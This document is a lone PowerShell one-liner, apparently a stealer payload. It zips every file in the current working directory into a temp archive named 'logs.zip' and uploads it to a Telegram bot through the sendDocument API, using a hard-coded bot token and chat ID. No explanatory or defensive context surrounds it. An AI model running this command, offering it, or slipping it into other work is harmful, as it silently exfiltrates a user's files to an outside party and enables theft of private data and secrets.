powershell -Command "$token='7458211664:AAGQ4V4Q2iJwGrxuNtnGbZKMaKrYCMgUHXk'; $chat='5620004341'; $path=(Get-Location).Path; $zip=\"$env:temp\\logs.zip\"; Compress-Archive -Path \"$path\\*\" -DestinationPath $zip -Force; Add-Type -AssemblyName 'System.Net.Http'; $client = [System.Net.Http.HttpClient]::new(); $content = [System.Net.Http.MultipartFormDataContent]::new(); $fileStream = [System.IO.FileStream]::new($zip, [System.IO.FileMode]::Open); $fileContent = [System.Net.Http.StreamContent]::new($fileStream); $content.Add($fileContent, 'document', 'logs.zip'); $response = $client.PostAsync(\"https://api.telegram.org/bot$token/sendDocument?chat_id=$chat\", $content).Result; $response.EnsureSuccessStatusCode();"